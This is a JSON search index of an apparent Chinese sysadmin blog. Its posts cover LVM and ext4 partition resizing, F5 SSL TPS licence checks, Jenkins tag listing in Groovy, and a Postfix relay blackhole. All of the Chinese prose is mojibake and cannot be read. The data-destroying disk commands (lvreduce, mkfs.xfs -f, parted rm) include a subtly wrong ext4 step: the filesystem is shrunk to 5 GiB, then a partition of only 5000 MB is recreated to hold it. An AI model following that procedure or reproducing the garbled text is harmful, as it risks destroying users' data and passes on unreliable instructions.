home\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eplease enter label \u003cspan class=\"k\"\u003efor\u003c/span\u003e media in drive \u003cspan class=\"m\"\u003e0\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003etimeout in \u003cspan class=\"m\"\u003e300\u003c/span\u003e sec\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-\u0026gt; home\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# umount /home\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# lvreduce -L 2G /dev/mapper/centos-home\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDo you really want to reduce home? \u003cspan class=\"o\"\u003e[\u003c/span\u003ey/n\u003cspan class=\"o\"\u003e]\u003c/span\u003e: y  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åæ‰©å……rootåˆ†åŒºï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# lvextend -L +18G /dev/mapper/centos-root\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# xfs_growfs /dev/mapper/centos-root\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæœ€åæ¢å¤homeåˆ†åŒº\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# mkfs.xfs -f /dev/mapper/centos-home\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# mount /home\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# xfsrestore -f /home.xfsdump /home\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæå®š\u003c/p\u003e","title":"LVMè°ƒæ•´åˆ†åŒºå¤§å°"},{"content":"å…¬å¸ç”¨åˆ°äº†SSLçš„æ³›åŸŸåè¯ä¹¦ï¼Œç½‘ç«™æ•´ä½“å¥—ä¸Šäº†HTTPSï¼Œç„¶åæœ€å‰é¢æ˜¯F5åšSSLçš„å¸è½½ã€‚\néº»çƒ¦ä¹Ÿæ¥äº†ï¼ŒF5çš„SSL Transactions Per Second (TPS) æ˜¯æœ‰licenseçš„ï¼Œé¦–å…ˆæ£€æŸ¥ä¸€ä¸‹å§\ntmsh show sys license detail | grep -i perf_SSL_total_TPS perf_SSL_total_TPS [500] æ˜¾ç¤ºæ˜¯500\nè¿˜å¾—æŸ¥æŸ¥æœ‰å‡ ä¸ªæ ¸å¿ƒ\ntmsh show sys tmm-info global | grep -i \u0026#39;TMM count\u0026#39; TMM Count 4 4ä¸ªæ ¸å¿ƒ\né‚£ä¹ˆæ¯ç§’SSLçš„TPSé™åˆ¶å°±æ˜¯ 500X4=2000\nè¶…è¿‡2000å°±å¾—å»å¢åŠ licenseäº†ã€‚\n","permalink":"https://rendoumi.com/posts/20240124-f5_bigip_ssl/","summary":"\u003cp\u003eå…¬å¸ç”¨åˆ°äº†SSLçš„æ³›åŸŸåè¯ä¹¦ï¼Œç½‘ç«™æ•´ä½“å¥—ä¸Šäº†HTTPSï¼Œç„¶åæœ€å‰é¢æ˜¯F5åšSSLçš„å¸è½½ã€‚\u003c/p\u003e\n\u003cp\u003eéº»çƒ¦ä¹Ÿæ¥äº†ï¼ŒF5çš„SSL Transactions Per Second (TPS) æ˜¯æœ‰licenseçš„ï¼Œé¦–å…ˆæ£€æŸ¥ä¸€ä¸‹å§\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etmsh show sys license detail \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -i perf_SSL_total_TPS  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eperf_SSL_total_TPS \u003cspan class=\"o\"\u003e[\u003c/span\u003e500\u003cspan class=\"o\"\u003e]\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ˜¾ç¤ºæ˜¯500\u003c/p\u003e\n\u003cp\u003eè¿˜å¾—æŸ¥æŸ¥æœ‰å‡ ä¸ªæ ¸å¿ƒ\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etmsh show sys tmm-info global \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -i \u003cspan class=\"s1\"\u003e\u0026#39;TMM count\u0026#39;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eTMM Count               \u003cspan class=\"m\"\u003e4\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e4ä¸ªæ ¸å¿ƒ\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆæ¯ç§’SSLçš„TPSé™åˆ¶å°±æ˜¯ 500X4=2000\u003c/p\u003e\n\u003cp\u003eè¶…è¿‡2000å°±å¾—å»å¢åŠ licenseäº†ã€‚\u003c/p\u003e","title":"F5-bigipçš„SSLæ¯ç§’ä¼ è¾“(TPS)é™åˆ¶"},{"content":"åœºæ™¯æ˜¯è¿™æ ·çš„ï¼Œæœ‰ä¸¤å°jenkinsã€‚ä¸€å°æ˜¯æ­£å¸¸å®‰è£…åœ¨linuxä¸Šçš„ï¼Œå¦å¤–ä¸€å°æ˜¯åœ¨macosä¸Šçš„ã€‚\nåœ¨macosä¸Šçš„è¿™å°ï¼Œè£…äº†æœ‰xcodeå’Œandroid studioï¼Œè´Ÿè´£ipaå’Œapkçš„è‡ªåŠ¨æ‰“åŒ…ã€‚\nè€Œåœ¨linuxä¸Šjenkinsåˆ™æ˜¯ä¸»jenkinsï¼Œè´Ÿè´£å¾ˆå¤šé¡¹ç›®çš„æ‰“åŒ…ã€‚\nè¿™æ ·ä¸¤å°çš„ç›®æ ‡å°±éƒ½å¾ˆæ˜ç¡®ï¼Œéº»çƒ¦çš„æ˜¯éœ€è¦æ¥å›ç™»å½•æ¥æ„å»ºé¡¹ç›®ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰æ–¹æ³•ä»ç¬¬ä¸€å°ä¸Šç›´æ¥è°ƒç”¨ç¬¬äºŒå°çš„é¡¹ç›®è¿›è¡Œæ„å»ºå‘¢ï¼Ÿ\nå½“ç„¶å¯ä»¥ï¼Œç›´æ¥å‘ä¸ªå¸¦Tokençš„urlåˆ°ç¬¬äºŒå°å°±å¯ä»¥ã€‚\nè¿™ä¸ªä¸æ˜¯æœ¬æ–‡çš„é‡ç‚¹ï¼Œæœ¬æ–‡é‡ç‚¹ï¼Œæºç æ˜¯Gitçš„buildè¿‡ç¨‹ï¼Œjenkinsè£…äº†Git parameteræ’ä»¶åæ”¯æŒé€‰tagè¿›è¡Œbuildingã€‚\nè¿™æ ·å¦‚æœä¸¤å°éƒ½è¿™ä¹ˆæ¥ä¸€ä¸‹ï¼Œå®é™…æ˜¯åœ¨ä¸¤å°éƒ½git checkäº†ä¸€ä¸‹ï¼Œç„¶åå¼€å§‹buildï¼Œè¿™å¯¹äºç¬¬ä¸€å°æ¥è¯´ï¼Œæ¯«æ— å¿…è¦ã€‚\nç¬¬ä¸€å°ä¸»jenkinsçš„ä»»åŠ¡å°±æ˜¯çœ‹çœ‹gité¡¹ç›®ä¸­éƒ½æœ‰ä»€ä¹ˆtagï¼Œç„¶åæŠŠtagå‘é“¾æ¥ç»™ç¬¬äºŒå°å³å¯ï¼Œæ²¡å¿…è¦checkçš„ã€‚\nè€Œç¬¬äºŒå°ä¹Ÿä¸å»çœ‹tagï¼Œç›´æ¥ä»gitä¸­checkoutå‡ºç¬¬ä¸€å°ä¼ è¿‡æ¥çš„tagç‰ˆæœ¬ï¼Œè¿›è¡Œæ„é€ ï¼Œè¿™æ ·æœ€çœèµ„æºã€‚\né‚£ä¹ˆï¼Œæ€ä¹ˆè®©ç¬¬ä¸€å°åªæŸ¥çœ‹tagå‘¢ï¼Ÿ\nä¸‡èƒ½çš„groovyå¤§æ³•ï¼š\ndef gettags = \u0026#34;git ls-remote -t git@git.coding.net:doabc/app-abc.git\u0026#34;.execute() def tags = [] def t1 = [] gettags.text.eachLine {tags.add(it)} for(i in tags) t1.add(i.split()[1].replaceAll(\u0026#39;\\\\^\\\\{\\\\}\u0026#39;, \u0026#39;\u0026#39;).replaceAll(\u0026#39;refs/tags/\u0026#39;, \u0026#39;\u0026#39;)) t1 = t1.unique() return t1 æ³¨æ„ä¸Šé¢ï¼Œgroovyå’Œgitçš„è¯ä¹¦éœ€è¦éƒ½äº‹å…ˆé…å¥½ã€‚\n","permalink":"https://rendoumi.com/posts/20240124-jenkins_two_server/","summary":"\u003cp\u003eåœºæ™¯æ˜¯è¿™æ ·çš„ï¼Œæœ‰ä¸¤å°jenkinsã€‚ä¸€å°æ˜¯æ­£å¸¸å®‰è£…åœ¨\u003ccode\u003elinux\u003c/code\u003eä¸Šçš„ï¼Œå¦å¤–ä¸€å°æ˜¯åœ¨\u003ccode\u003emacos\u003c/code\u003eä¸Šçš„ã€‚\u003c/p\u003e\n\u003cp\u003eåœ¨macosä¸Šçš„è¿™å°ï¼Œè£…äº†æœ‰xcodeå’Œandroid studioï¼Œè´Ÿè´£ipaå’Œapkçš„è‡ªåŠ¨æ‰“åŒ…ã€‚\u003c/p\u003e\n\u003cp\u003eè€Œåœ¨linuxä¸Šjenkinsåˆ™æ˜¯ä¸»jenkinsï¼Œè´Ÿè´£å¾ˆå¤šé¡¹ç›®çš„æ‰“åŒ…ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™æ ·ä¸¤å°çš„ç›®æ ‡å°±éƒ½å¾ˆæ˜ç¡®ï¼Œéº»çƒ¦çš„æ˜¯éœ€è¦æ¥å›ç™»å½•æ¥æ„å»ºé¡¹ç›®ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰æ–¹æ³•ä»ç¬¬ä¸€å°ä¸Šç›´æ¥è°ƒç”¨ç¬¬äºŒå°çš„é¡¹ç›®è¿›è¡Œæ„å»ºå‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240124100017245\" loading=\"lazy\" src=\"/posts/20240124-jenkins_two_server/image-20240124100017245.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå½“ç„¶å¯ä»¥ï¼Œç›´æ¥å‘ä¸ªå¸¦Tokençš„urlåˆ°ç¬¬äºŒå°å°±å¯ä»¥ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™ä¸ªä¸æ˜¯æœ¬æ–‡çš„é‡ç‚¹ï¼Œæœ¬æ–‡é‡ç‚¹ï¼Œæºç æ˜¯Gitçš„buildè¿‡ç¨‹ï¼Œjenkinsè£…äº†Git parameteræ’ä»¶åæ”¯æŒé€‰tagè¿›è¡Œbuildingã€‚\u003c/p\u003e\n\u003cp\u003eè¿™æ ·å¦‚æœä¸¤å°éƒ½è¿™ä¹ˆæ¥ä¸€ä¸‹ï¼Œå®é™…æ˜¯åœ¨ä¸¤å°éƒ½git  checkäº†ä¸€ä¸‹ï¼Œç„¶åå¼€å§‹buildï¼Œè¿™å¯¹äºç¬¬ä¸€å°æ¥è¯´ï¼Œæ¯«æ— å¿…è¦ã€‚\u003c/p\u003e\n\u003cp\u003eç¬¬ä¸€å°ä¸»jenkinsçš„ä»»åŠ¡å°±æ˜¯çœ‹çœ‹gité¡¹ç›®ä¸­éƒ½æœ‰ä»€ä¹ˆtagï¼Œç„¶åæŠŠtagå‘é“¾æ¥ç»™ç¬¬äºŒå°å³å¯ï¼Œæ²¡å¿…è¦checkçš„ã€‚\u003c/p\u003e\n\u003cp\u003eè€Œç¬¬äºŒå°ä¹Ÿä¸å»çœ‹tagï¼Œç›´æ¥ä»gitä¸­checkoutå‡ºç¬¬ä¸€å°ä¼ è¿‡æ¥çš„tagç‰ˆæœ¬ï¼Œè¿›è¡Œæ„é€ ï¼Œè¿™æ ·æœ€çœèµ„æºã€‚\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆï¼Œæ€ä¹ˆè®©ç¬¬ä¸€å°åªæŸ¥çœ‹tagå‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eä¸‡èƒ½çš„groovyå¤§æ³•ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edef \u003cspan class=\"nv\"\u003egettags\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;git ls-remote -t git@git.coding.net:doabc/app-abc.git\u0026#34;\u003c/span\u003e.execute\u003cspan class=\"o\"\u003e()\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edef \u003cspan class=\"nv\"\u003etags\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e[]\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edef \u003cspan class=\"nv\"\u003et1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e[]\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egettags.text.eachLine \u003cspan class=\"o\"\u003e{\u003c/span\u003etags.add\u003cspan class=\"o\"\u003e(\u003c/span\u003eit\u003cspan class=\"o\"\u003e)}\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efor\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003ei in tags\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    t1.add\u003cspan class=\"o\"\u003e(\u003c/span\u003ei.split\u003cspan class=\"o\"\u003e()[\u003c/span\u003e1\u003cspan class=\"o\"\u003e]\u003c/span\u003e.replaceAll\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\\\\^\\\\{\\\\}\u0026#39;\u003c/span\u003e, \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e.replaceAll\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;refs/tags/\u0026#39;\u003c/span\u003e, \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003et1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e t1.unique\u003cspan class=\"o\"\u003e()\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e t1  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ä¸Šé¢ï¼Œgroovyå’Œgitçš„è¯ä¹¦éœ€è¦éƒ½äº‹å…ˆé…å¥½ã€‚\u003c/p\u003e","title":"ä¸¤å°ä¸åŒç³»ç»Ÿä¸ŠJenkinsçš„è”åŠ¨"},{"content":"é…ç½®postfixå…è®¸è‡ªç”±è½¬å‘å†…ç½‘çš„é‚®ä»¶ï¼Œå°±æ”¹ä¸€ä¸ªåœ°æ–¹å³å¯ï¼Œæ·»åŠ å…è®¸å‘é€çš„å†…ç½‘ç½‘æ®µï¼š\nvi /etc/postfix/main.cf ... mynetworks = 127.0.0.0/8, 172.16.0.0/16 ... é…ç½®é»‘æ´ï¼Œæ‰€æœ‰é‚®ä»¶éƒ½æ¥å—ï¼Œç„¶ådropä¸¢æ‰\nrelayhost = relay_transport = relay relay_domains = static:ALL smtpd_end_of_data_restrictions = check_client_access static:discard å½“ç„¶ï¼Œä¹Ÿå¯ä»¥æŠŠè¿™äº›é‚®ä»¶éƒ½ç»™é€åˆ°amaviså»ï¼Œè®­ç»ƒå®ƒè¯†åˆ«åƒåœ¾é‚®ä»¶\næµ‹è¯•é‚®ä»¶å‘é€çš„å‘½ä»¤ï¼š\necho \u0026#34;body of your email\u0026#34; | mail -s \u0026#34;This is a Subject os version\u0026#34; -r \u0026#34;abc@kindlefan.xin\u0026#34; test@abc.com æ³¨æ„ï¼šCentOSå’ŒUbuntué»˜è®¤å±…ç„¶éƒ½æ²¡æœ‰mailè¿™æ¡å‘½ä»¤çš„è¯\nyum install mailx apt-get install bsd-mailx ","permalink":"https://rendoumi.com/posts/20240124-postfix_blackhole/","summary":"\u003cp\u003eé…ç½®postfixå…è®¸è‡ªç”±è½¬å‘å†…ç½‘çš„é‚®ä»¶ï¼Œå°±æ”¹ä¸€ä¸ªåœ°æ–¹å³å¯ï¼Œæ·»åŠ å…è®¸å‘é€çš„å†…ç½‘ç½‘æ®µï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/postfix/main.cf  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003emynetworks\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e 127.0.0.0/8, 172.16.0.0/16  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé…ç½®é»‘æ´ï¼Œæ‰€æœ‰é‚®ä»¶éƒ½æ¥å—ï¼Œç„¶ådropä¸¢æ‰\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003erelayhost\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003erelay_transport\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e relay  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003erelay_domains\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e static:ALL  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003esmtpd_end_of_data_restrictions\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e check_client_access static:discard  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå½“ç„¶ï¼Œä¹Ÿå¯ä»¥æŠŠè¿™äº›é‚®ä»¶éƒ½ç»™é€åˆ°amaviså»ï¼Œè®­ç»ƒå®ƒè¯†åˆ«åƒåœ¾é‚®ä»¶\u003c/p\u003e\n\u003cp\u003eæµ‹è¯•é‚®ä»¶å‘é€çš„å‘½ä»¤ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;body of your email\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e mail -s \u003cspan class=\"s2\"\u003e\u0026#34;This is a Subject os version\u0026#34;\u003c/span\u003e -r \u003cspan class=\"s2\"\u003e\u0026#34;abc@kindlefan.xin\u0026#34;\u003c/span\u003e test@abc.com  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ï¼š\u003ccode\u003eCentOS\u003c/code\u003eå’Œ\u003ccode\u003eUbuntu\u003c/code\u003eé»˜è®¤å±…ç„¶éƒ½æ²¡æœ‰mailè¿™æ¡å‘½ä»¤çš„è¯\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install mailx  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt-get install bsd-mailx  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"é…ç½®postfixè½¬å‘å±€åŸŸç½‘é‚®ä»¶ä»¥åŠé‚®ä»¶é»‘æ´"},{"content":"ç¼©å°/ çš„ext4åˆ†åŒºæ­¥éª¤å¦‚ä¸‹ï¼š\né¦–å…ˆæŸ¥çœ‹åˆ†åŒºæ˜¯ä»€ä¹ˆæ–‡ä»¶ç±»å‹\nfile -sL /dev/sd* /dev/sda: x86 boot sector; GRand Unified Bootloader, stage1 version 0x3, boot drive 0x80, 1st sector stage2 0x2044148, GRUB version 0.94; partition 1: ID=0x82, starthead 32, startsector 2048, 8388608 sectors; partition 2: ID=0x83, active, starthead 75, startsector 8390656, 411039744 sectors, code offset 0x48 /dev/sda1: Linux/i386 swap file (new style) 1 (4K pages) size 1048575 pages /dev/sda2: Linux rev 1.0 ext4 filesystem data (needs journal recovery) (extents) (large files) (huge files) èƒ½çœ‹å‡ºæ¥sda1æ˜¯äº¤æ¢åˆ†åŒºï¼Œé‚£ä¹ˆè¦ç¼©çš„åˆ†åŒºæ˜¯/dev/sda2ï¼Œæ–‡ä»¶ç±»å‹æ˜¯ext4\nokï¼Œå…ˆç¡®ä¿è™šæœºå†…/åˆ†åŒºåªå åˆ°5Gï¼Œç„¶åæœ€å¥½é‡æ–°æ‹·è´ä¸€ä¸‹qcow2æ–‡ä»¶ï¼ŒæŠŠæ–‡ä»¶åˆ°å¼„åˆ°å‰é¢5Gä¸­ã€‚\nç„¶åä¿®æ”¹ä¸€ä¸‹kvmè™šæœºé…ç½®ï¼Œå…ˆåŠ ä¸ªisoè¿›å…¥rescueæ¨¡å¼\nvirsh edit xxx æŠŠbooté¡ºåºä»hdæ”¹æˆcdrom ... \u0026lt;boot dev=\u0026#39;hd\u0026#39;/\u0026gt; \u0026lt;boot dev=\u0026#39;cdrom\u0026#39;/\u0026gt; ... \u0026lt;disk type=\u0026#39;file\u0026#39; device=\u0026#39;cdrom\u0026#39;\u0026gt; \u0026lt;driver name=\u0026#39;qemu\u0026#39; type=\u0026#39;raw\u0026#39;/\u0026gt; \u0026lt;source file=\u0026#39;/export/kvm/iso/CentOS-7-x86_64-NetInstall-1708.iso\u0026#39;/\u0026gt; \u0026lt;target dev=\u0026#39;hdc\u0026#39; bus=\u0026#39;ide\u0026#39;/\u0026gt; \u0026lt;readonly/\u0026gt; \u0026lt;address type=\u0026#39;drive\u0026#39; controller=\u0026#39;0\u0026#39; bus=\u0026#39;1\u0026#39; target=\u0026#39;0\u0026#39; unit=\u0026#39;0\u0026#39;/\u0026gt; \u0026lt;/disk\u0026gt; ... ç³»ç»Ÿå¯åŠ¨ï¼Œè¿›å…¥cdromå®‰è£…ï¼Œé€‰æ‹©Troubleshooting\né€‰æ‹©Rescue\nå› ä¸ºè¦å¯¹ç£ç›˜æ“ä½œï¼Œæ‰€ä»¥ä¸èƒ½é€‰1æŠŠç¡¬ç›˜mountåˆ°/mnt/sysimageï¼Œé€‰æ‹©3ï¼Œä¸mountç¡¬ç›˜ï¼Œç›´æ¥è¿›å…¥ä¸€ä¸ªshell\næ£€æŸ¥ç£ç›˜ï¼Œç¼©å‡/dev/sda2 åˆ°5Gç©ºé—´\ne2fsck -f /dev/sda2 resize2fs /dev/sda2 5G æ³¨æ„ï¼Œç°åœ¨åªåšäº†ä¸€åŠï¼Œæ–‡ä»¶æ˜¯è¢«é›†ä¸­åˆ°/dev/sda2çš„å‰5Gç©ºé—´é‡Œé¢å»äº†ã€‚ä½†æ˜¯ï¼Œç¡¬ç›˜åˆ†åŒºè¿˜æ²¡æœ‰æ›´æ”¹ã€‚\næ¥ç€æ¥ï¼Œç”¨partedæ¥ä¿®æ”¹åˆ†åŒº\nparted /dev/sda print æŸ¥çœ‹åå‘ç°å‰2096æ˜¯swapåˆ†åŒºï¼Œ2æ˜¯/dev/sda2 åˆ é™¤/dev/sda2 rm 2 é‡å»º mkpart ... primary ... 2096 ... 7096 æ³¨æ„ï¼Œæ–°å»ºçš„/dev/sda2èµ·ç‚¹æ˜¯2096ï¼Œåˆ†åŒºç»ˆç‚¹æ˜¯2096+5000=7096\næœ€åå†è¿è¡Œä¸€ä¸‹ç£ç›˜æ£€æŸ¥å’Œé‡å»º\ne2fsck -f /dev/sda2 resize2fs /dev/sda2 5G é‡å¯æå®šï¼\n","permalink":"https://rendoumi.com/posts/20240124-ext4_resize/","summary":"\u003cp\u003eç¼©å°\u003ccode\u003e/\u003c/code\u003e çš„\u003ccode\u003eext4\u003c/code\u003eåˆ†åŒºæ­¥éª¤å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆæŸ¥çœ‹åˆ†åŒºæ˜¯ä»€ä¹ˆæ–‡ä»¶ç±»å‹\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efile -sL /dev/sd*  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sda:  x86 boot sector\u003cspan class=\"p\"\u003e;\u003c/span\u003e GRand Unified Bootloader, stage1 version 0x3, boot drive 0x80, 1st sector stage2 0x2044148, GRUB version 0.94\u003cspan class=\"p\"\u003e;\u003c/span\u003e partition 1: \u003cspan class=\"nv\"\u003eID\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e0x82, starthead 32, startsector 2048, \u003cspan class=\"m\"\u003e8388608\u003c/span\u003e sectors\u003cspan class=\"p\"\u003e;\u003c/span\u003e partition 2: \u003cspan class=\"nv\"\u003eID\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e0x83, active, starthead 75, startsector 8390656, \u003cspan class=\"m\"\u003e411039744\u003c/span\u003e sectors, code offset 0x48\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sda1: Linux/i386 swap file \u003cspan class=\"o\"\u003e(\u003c/span\u003enew style\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e4K pages\u003cspan class=\"o\"\u003e)\u003c/span\u003e size \u003cspan class=\"m\"\u003e1048575\u003c/span\u003e 